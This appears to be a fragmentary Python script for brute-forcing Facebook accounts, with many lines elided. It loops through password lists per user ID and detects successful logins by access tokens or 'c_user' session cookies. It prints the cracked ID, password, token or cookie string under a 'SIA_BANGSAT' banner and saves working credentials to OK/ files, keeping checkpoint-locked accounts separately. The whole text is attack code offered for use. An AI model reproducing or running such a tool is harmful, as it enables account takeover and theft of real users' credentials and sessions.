...
def cek_ttl_cp(uid, pw):
	try:
		...
		with requests.Session() as ses:
			...
			print("\r\033[0;96m[SIA_BANGSAT] %s|%s|%s %s %s\033[0;96m"%(uid, pw, day, month, year))
...
def bapi(user):
	try:
		ua = open(".ua", "r").read()
                ...
                ua = ("Mozilla/5.0 (Linux; Android 11; SM-A115F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.56 Mobile Safari/537.36;]")
	...
	try:
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				print("\r\033[0;92m[SIA_BANGSAT] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
			elif "www.facebook.com" in send.json()["error_msg"]:
				print("\r\033[0;96m[SIA_BANGSAT] %s|%s\033[0;96m        "%(uid, pw))
				cp.append("%s|%s"%(uid, pw))
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;92m[SIA_BANGSAT] %s|%s|%s\033[0;95m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
...
def mobile(user):
	...
	try:
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print("\r\033[0;92m[SIA_BANGSAT] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
				ok.append("%s|%s"%(uid, pw))
				open("OK/%s.txt"%(tBilall),"a").write(" + %s|%s\n"%(uid, pw))
				break
				continue
